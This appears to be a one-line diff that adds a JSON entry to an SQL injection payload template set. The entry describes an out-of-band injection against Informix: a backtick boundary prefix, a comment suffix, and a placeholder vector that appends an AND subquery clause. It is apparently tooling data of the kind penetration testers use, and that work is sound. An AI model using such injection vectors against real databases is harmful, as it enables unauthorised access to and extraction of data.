@@ -1,0 +1,1 @@
+{"dbms": "informix", "technique": "oob", "boundary": {"prefix": "`", "suffix": "-- -", "type": "backtick"}, "vector": "{B} AND 1=(SELECT ({Q}))/*OOB {OOB}*/", "comment": "informix oob: backtick"}
